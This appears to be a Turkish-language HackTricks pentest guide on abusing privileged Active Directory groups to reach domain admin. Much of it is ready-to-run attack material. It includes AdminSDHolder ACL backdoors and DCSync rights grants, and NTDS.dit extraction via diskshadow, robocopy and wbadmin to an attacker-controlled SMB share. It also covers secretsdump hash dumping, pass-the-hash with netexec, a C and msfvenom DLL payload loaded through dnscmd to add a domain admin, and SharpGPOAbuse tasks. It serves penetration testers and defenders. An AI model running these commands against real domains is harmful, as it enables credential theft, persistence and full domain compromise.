# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetici ayrıcalıklarına sahip iyi bilinen gruplar

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, etki alanında yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca Domain Controller'a (DC) yerel olarak oturum açmayı sağlar.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Yeni kullanıcılar eklemeye ve DC'ye yerel olarak giriş yapmaya izin verilir.<sup>[[1]](#references)</sup>

Hesap yönetiminden yerel yönetici erişimine giden koşullu bir yol, **bir bilgisayarın LAPS parolasını okumak için yetkilendirilmiş sıradan bir gruptur**. Bu belirli grup üzerindeki etkin üyelik yazma haklarını, grubun korumalı olup olmadığını ve yeni veya kontrolünüzdeki bir hesabın gerçekten gruba katılıp katılamayacağını kontrol edin. Hedef bilgisayarın LAPS okuma iznini test etmeden önce hesabın token'ını yenileyin. Şifrelenmiş Windows LAPS için dizin okuma izni ve parolayı çözme yetkisi ayrı gerekliliklerdir; grup üyeliği veya Account Operators üyeliği tek başına bunlardan hiçbirini sağlamaz. Bkz. [Microsoft'un Account Operators kapsamı](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) ve [Windows LAPS yetkilendirmesi](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder grubu

**AdminSDHolder** grubunun Access Control List'i (ACL), Active Directory içindeki yüksek ayrıcalıklı gruplar da dahil olmak üzere tüm "korumalı grupların" izinlerini belirlediği için kritik öneme sahiptir. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirip standart bir kullanıcıya tam izinler vererek bundan yararlanabilir. Böylece kullanıcı, tüm korumalı gruplar üzerinde tam denetim elde eder. Bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı gereği bir saat içinde otomatik olarak yeniden uygulanır.<sup>[[14]](#references)</sup>

Güncel Windows Server belgeleri, yerleşik çeşitli operator gruplarını hâlâ **korumalı** nesneler olarak tanımlar (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` vb.). **SDProp** işlemi varsayılan olarak her 60 dakikada bir **PDC Emulator** üzerinde çalışır, `adminCount=1` değerini ayarlar ve korumalı nesnelerde devralmayı devre dışı bırakır. Bu, hem kalıcılık sağlamak hem de korumalı bir gruptan çıkarıldığı hâlde devralma yapmayan ACL'si kalmış eski ayrıcalıklı kullanıcıları tespit etmek için kullanışlıdır.<sup>[[12]](#references)</sup>

Üyeleri incelemek ve izinleri değiştirmek için kullanılacak komutlar:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Geri yükleme sürecini hızlandırmak için bir script mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.<sup>[[14]](#references)</sup>

## AD Geri Dönüşüm Kutusu

Silinmiş nesnelerin görünürlüğü, geçerli dizin izinlerine bağlıdır; yalnızca bir grup adı, mevcut kimliğin bir nesneyi listeleyebildiğini veya geri yükleyebildiğini kanıtlamaz. Tam geri yükleme için silme işleminden önce AD Recycle Bin etkinleştirilmiş olmalıdır. Ayrıca geri yükleme işlemi, naming-context kökünde Reanimate-Tombstones iznini, yeniden adlandırma haklarını ve hedef kapsayıcıda CREATE_CHILD iznini gerektirir. [Microsoft'un Recycle Bin yönergeleri](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) ve [silinen nesneleri geri alma yetkilendirme kuralları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) bu koşulları birbirinden ayırır. Silinmiş nesneleri okuma erişimi olan yetkili bir kimlik, hassas bilgileri açığa çıkarabilecek kayıtları inceleyebilir:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinmiş nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPN'ler veya başka bir operatörün daha sonra geri yükleyebileceği silinmiş ayrıcalıklı bir grubun DN'sini açığa çıkarabilir.

Uygulama tarafından tanımlanan öznitelikler, nesne silinmiş durumda kalırken eski kimlik bilgilerini de saklayabilir. Bunu ayrı bir inceleme ipucu olarak değerlendirin: mevcut kimlik, silinmiş nesneyi listeleyebilmeli **ve** bu özniteliği okuyabilmeli, değer kullanılabilir bir kimlik bilgisi olmalı ve hâlâ etkin olan bir sorumlu bu kimlik bilgisini kabul etmelidir. Grup üyeliği veya silinmiş bir hesap adı tek başına bu adımlardan hiçbirini kanıtlamaz; rutin listeleme sırasında kimlik bilgisi değerlerini yazdırmaktan kaçının. [Microsoft'un Recycle Bin belgeleri](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin), silme sonrasında özniteliklerin korunmasını açıklar.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Etki Alanı Denetleyicisine Erişim

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun üyesi olmadığı sürece kısıtlıdır; bu gruba üyelik erişim düzeyini değiştirir.

### Yetki Yükseltme

Sysinternals'tan `PsService` veya `sc` kullanılarak hizmet izinleri incelenebilir ve değiştirilebilir. Örneğin `Server Operators` grubu, belirli hizmetler üzerinde tam denetime sahiptir; bu da rastgele komutların çalıştırılmasına ve yetki yükseltmeye olanak tanır:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu ve yükseltilmiş ayrıcalıklar elde etmek için hizmetleri değiştirebildiğini gösterir.

## Backup Operators

`Backup Operators` üyeliği, yerel ilkeye ve oturum açma oturumuna bağlı olarak bir ana bilgisayarda `SeBackupPrivilege` ve `SeRestorePrivilege` ayrıcalıklarını sağlayabilir. Komutları çalıştıran sürecin **etkin token'ını** `whoami /groups` ve `whoami /priv` komutlarıyla kontrol edin: yalnızca üyelik, `SeBackupPrivilege` ayrıcalığının mevcut ve etkin olduğunu kanıtlamaz. Ayrıcalık mevcut ancak devre dışıysa bu token'da etkinleştirilebilir; mevcut değilse veya kaldırılmışsa yedekleme işlemleri bu ayrıcalığı kullanamaz. `SeBackupPrivilege`, yedekleme uyumlu API'ler (örneğin `FILE_FLAG_BACKUP_SEMANTICS` veya `robocopy /B`) aracılığıyla korumalı **okuma** işlemlerini destekler; `SeRestorePrivilege`, geri yükleme/yazma işlemleri için ayrı bir ayrıcalıktır. Normal dizin listeleme ve kopyalama işlemleri yedekleme semantiğini kullanmayabilir.<sup>[[1]](#references)</sup>

Grup üyelerini listelemek için şu komutu çalıştırın:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Yerel Saldırı

Etkin token'da `SeBackupPrivilege` bulunan bir host'ta, backup-aware copy aşağıdaki gibi korumalı bir dosyayı okuyabilir:

1. Gerekli kütüphaneleri içe aktarın:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Ayrıcalık mevcut ancak devre dışıysa etkinleştirin ve bu işlemdeki durumunu doğrulayın:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Örneğin, kısıtlı bir dizinden dosya kopyalayın:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit`, **domain controller (DC)** üzerindeki Active Directory veritabanıdır. Bu yol, DC üzerinde uygun bir token ve veritabanını içeren birime erişim gerektirir; başka bir yerde Backup Operators üyeliğine sahip olmak belirli bir DC’ye erişim sağlamaz. Canlı veritabanı normalde kilitlidir; bu nedenle kopyalamadan önce erişilebilir bir shadow copy veya başka bir yedekleme olanağı kullanın. Shadow copy oluşturmak veya erişime açmak da sunucunun VSS yapılandırmasına ve çağrıyı yapan kişinin haklarına bağlıdır. Aşağıdaki örnekte DC’nin `NTDS.dit` dosyasını `C:` sürücüsünde `\Windows\NTDS` altında tuttuğu varsayılmıştır; durum böyle değilse birimi ve yolu değiştirin.

#### diskshadow.exe kullanımı

1. İzin veriliyorsa DC’nin `C:` sürücüsünün shadow copy’sini oluşturup `F:` olarak erişime açın:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. `NTDS.dit` dosyasını shadow copy'den kopyalayın:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatif olarak, dosyaları kopyalamak için `robocopy` kullanın:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. DC'nin `SYSTEM` hive'ını çevrimdışı çıkarım için kaydedin. `SAM`, üye sistemlerde yerel hesap veritabanıdır; bir DC'nin `SAM` hive'ı `NTDS.dit`'in yerine geçmez ve domain Administrator hash'inin kaynağı değildir:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` ve `SYSTEM.SAV` dosyalarını analiz makinesine aktarın ve etki alanı hesabı hash'lerini çıkarın. Bir üye sistemden alınan kayıtlı `SAM` hive'ı, eşleşen `SYSTEM` hive'ıyla birlikte yerel hesap hash'lerini verir:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. `NTDS.dit` dosyasından bir **domain** Administrator hash'i kurtarıldıysa, domain kimlik doğrulaması için test edilebilir. `SAM.SAV` dosyasından alınan yerel Administrator hash'i farklı bir kimlik bilgisidir ve domain Administrator olarak kimlik doğrulaması yapmaz.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe Kullanarak

1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemi kurun ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeklemesi ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Pratik bir gösterim için [IPPSEC İLE DEMO VİDEOSU](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) sayfasına bakın.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, ayrıcalıklarını kullanarak genellikle Domain Controller'larda barındırılan bir DNS sunucusuna SYSTEM ayrıcalıklarıyla rastgele bir DLL yükleyebilir. Bu yetenek, önemli ölçüde istismar potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Rastgele DLL çalıştırma (CVE‑2021‑40469)

> [!NOTE]
> Bu güvenlik açığı, DNS hizmetinde (genellikle DC'lerin içinde) SYSTEM ayrıcalıklarıyla rastgele kod yürütülmesine olanak tanır. Bu sorun 2021'de giderildi.

Üyeler, aşağıdaki gibi komutlar kullanarak DNS sunucusuna rastgele bir DLL (yerel olarak veya uzak bir paylaşımdan) yükletebilir:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLL'nin yüklenmesi için DNS hizmetinin yeniden başlatılması (ek izinler gerektirebilir) gerekir:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Bu saldırı vektörü hakkında daha fazla bilgi için ired.team'e başvurun.

#### Mimilib.dll

Komut yürütmek için mimilib.dll kullanmak da mümkündür; belirli komutları veya reverse shell'leri çalıştıracak şekilde değiştirilebilir. Daha fazla bilgi için [bu gönderiye göz atın](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### MitM için WPAD Kaydı

DnsAdmins, genel sorgu engelleme listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak MitM saldırıları gerçekleştirmek için DNS kayıtlarını değiştirebilir. Ağ trafiğini taklit etmek ve yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.

### Event Log Readers
Üyeler, düz metin parolalar veya komut yürütme ayrıntıları gibi hassas bilgileri bulma ihtimaliyle olay günlüklerine erişebilir:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Bu grup, domain object üzerindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync privileges verebilir. Bu gruptan yararlanarak privilege escalation sağlama teknikleri Exchange-AD-Privesc GitHub repo'sunda ayrıntılı olarak açıklanmıştır.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Bu grubun bir üyesi olarak hareket edebiliyorsanız, klasik kötüye kullanım yöntemi saldırganın kontrolündeki bir principal'a [DCSync](dcsync.md) için gereken çoğaltma izinlerini vermektir:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Tarihsel olarak **PrivExchange**, posta kutusu erişimini, zorla Exchange kimlik doğrulamasını ve LDAP relay'i birleştirerek aynı temel yöntemi kullanıyordu. Bu relay yolu azaltılmış olsa bile, `Exchange Windows Permissions` grubuna doğrudan üyelik veya bir Exchange sunucusu üzerinde denetim sahibi olmak, etki alanı çoğaltma haklarına ulaşmak için hâlâ yüksek değerli bir yoldur.

## Hyper-V Administrators

Hyper-V Administrators, Hyper-V üzerinde tam erişime sahiptir ve bu erişim sanallaştırılmış Domain Controller'ların denetimini ele geçirmek için kullanılabilir. Buna çalışan DC'leri klonlamak ve `NTDS.dit` dosyasından NTLM hash'lerini çıkarmak da dahildir.

### Exploitation Example

Pratikte kötüye kullanım genellikle eski host düzeyinde LPE numaraları yerine **DC disklerine/checkpoint'lerine çevrimdışı erişim** yoluyla gerçekleşir. Hyper-V host'una erişimi olan bir operatör, sanallaştırılmış bir Domain Controller için checkpoint oluşturabilir veya onu dışa aktarabilir, VHDX'i bağlayabilir ve guest içindeki LSASS'e dokunmadan `NTDS.dit`, `SYSTEM` ve diğer sırları çıkarabilir:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Buradan itibaren, `Windows\NTDS\ntds.dit` dosyasını ve registry hive'larını çevrimdışı kopyalamak için `Backup Operators` workflow'unu yeniden kullanın. İlgili backup-file workflow'u:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Bu grup, üyelerinin domainde Group Policy oluşturmasına olanak tanır. Ancak üyeleri, kullanıcı veya gruplara group policy uygulayamaz ya da mevcut GPO'ları düzenleyemez.

Önemli ayrıntı, **yeni GPO'nun sahibinin onu oluşturan kişi olması** ve genellikle bu kişinin GPO'yu daha sonra düzenlemek için yeterli haklara sahip olmasıdır. Bu da şu durumlarda bu grubu ilgi çekici kılar:

- kötü amaçlı bir GPO oluşturup bir yöneticiyi bunu hedef OU'ya/domaine bağlamaya ikna edebiliyorsanız
- oluşturduğunuz ve zaten yararlı bir yere bağlanmış olan bir GPO'yu düzenleyebiliyorsanız
- GPO'ları bağlamanıza olanak tanıyan başka bir devredilmiş hakkı kötüye kullanabiliyorsanız; bu grup da düzenleme olanağı sağlar

Pratikte kötüye kullanım genellikle SYSVOL destekli policy dosyaları aracılığıyla **Immediate Task**, **startup script**, **local admin üyeliği** veya **user rights assignment** değişikliği eklemek anlamına gelir.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

GPO'yu `SYSVOL` üzerinden manuel olarak düzenliyorsanız, değişikliğin tek başına yeterli olmadığını unutmayın: `versionNumber`, `GPT.ini` ve bazen `gPCMachineExtensionNames` de güncellenmelidir; aksi takdirde istemciler ilke yenilemesini yok sayar.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**'in dağıtıldığı ortamlarda, **Organization Management** olarak bilinen özel bir grup önemli yetkilere sahiptir. Bu grup, **tüm etki alanı kullanıcılarının posta kutularına erişme** ayrıcalığına sahiptir ve **'Microsoft Exchange Security Groups'** Organizational Unit (OU) üzerinde **tam denetim** sağlar. Bu denetim, ayrıcalık yükseltme için istismar edilebilen **`Exchange Windows Permissions`** grubunu da kapsar.

### Yetki İstismarı ve Komutlar

#### Print Operators

**Print Operators** grubunun üyelerine, **Domain Controller** üzerinde **yerel olarak oturum açmalarına**, onu kapatmalarına ve yazıcıları yönetmelerine olanak tanıyan **`SeLoadDriverPrivilege`** dahil çeşitli ayrıcalıklar verilmiştir. Bu ayrıcalıklardan yararlanmak için, özellikle **`SeLoadDriverPrivilege`** yükseltilmemiş bir bağlamda görünmüyorsa, User Account Control (UAC) atlatılmalıdır.<sup>[[1]](#references)</sup>

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Etki Alanı Denetleyicilerinde bu grup tehlikelidir; çünkü varsayılan Etki Alanı Denetleyicisi İlkesi, **`SeLoadDriverPrivilege`** ayrıcalığını `Print Operators` grubuna verir. Bu grubun bir üyesi için yükseltilmiş bir token elde ederseniz, ayrıcalığı etkinleştirip imzalı ancak güvenlik açığı bulunan bir sürücüyü yükleyerek kernel/SYSTEM düzeyine geçebilirsiniz.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Token işleme ayrıntıları için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) sayfasına bakın.

#### Remote Desktop Users

Bu grubun üyelerine Remote Desktop Protocol (RDP) aracılığıyla bilgisayarlara erişim izni verilir. Bu üyeleri numaralandırmak için PowerShell komutları kullanılabilir:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP'yi exploit etmeye ilişkin daha fazla bilgi, özel pentesting kaynaklarında bulunabilir.

#### Remote Management Users

Üyeler, **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin enumerasyonu şu şekilde gerçekleştirilir:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

WinRM ile ilgili exploitation teknikleri için ilgili dokümantasyona başvurulmalıdır.

#### Server Operators

Bu grup, yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma dahil olmak üzere Domain Controller'larda çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir.<sup>[[1]](#references)</sup> Üyeleri listelemek için verilen komut:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Etki Alanı Denetleyicilerinde `Server Operators` grubu, genellikle **hizmetleri yeniden yapılandırmak veya başlatıp durdurmak** için yeterli hakları devralır ve varsayılan DC ilkesi aracılığıyla `SeBackupPrivilege`/`SeRestorePrivilege` ayrıcalıklarına da sahip olur. Uygulamada bu, **hizmet denetiminin kötüye kullanılması** ile **NTDS extraction** arasında bir köprü oluşturur:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Bir hizmeti listeleyememek, **bilinen bir hizmete** erişimi dışlamaz. Service Control Manager, listeleme için `SC_MANAGER_ENUMERATE_SERVICE` iznini `SC_MANAGER_CONNECT` izninden ayrı denetler; adı belirtilen bir hizmeti açmak ise `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` dahil olmak üzere hizmete özgü izinleri denetler. Genel bir `sc.exe query` başarısız olsa bile etkin token'ı ve ilgili hizmetin ACL'sini inceleyin. Yapılandırma izinleri tek başına yalnızca olası bir adaydır: daha yüksek ayrıcalığa geçişin mümkün olup olmadığını hizmetin kimliği, başlatma/durdurma izinleri ve kullanılabilir bir tetikleyici de belirler. [Microsoft'un hizmet erişim hakları başvurusuna](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) bakın.

Bir hizmet ACL'si bu gruba değiştirme/başlatma hakları veriyorsa hizmeti rastgele bir komutu çalıştıracak şekilde ayarlayın, `LocalSystem` olarak başlatın ve ardından özgün `binPath` değerini geri yükleyin. Hizmet denetimi kısıtlıysa `NTDS.dit` dosyasını kopyalamak için yukarıdaki `Backup Operators` tekniklerini kullanın.

## References

- [1] [ired.team – Ayrıcalıklı hesaplar ve token ayrıcalıkları](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Ayrıcalık yükseltme için SeLoadDriverPrivilege'i kötüye kullanma](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO izinlerini kötüye kullanma](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO kötüye kullanımı, Bölüm 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO'lar ve OU'lar için red team uzmanı rehberi](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonim LDAP → Parola denemesi → SeBackupPrivilege → Etki alanı yöneticisi](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Ek C: Active Directory'de korunan hesaplar ve gruplar](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Etki alanı yöneticisi kalıcılığı elde etmek için AdminSDHolder'ı kötüye kullanma ve arka kapı ekleme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory'de yükseltme için DnsAdmins ayrıcalığını kötüye kullanma](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll kenarını kötüye kullanma bilgileri](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver işlevi (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
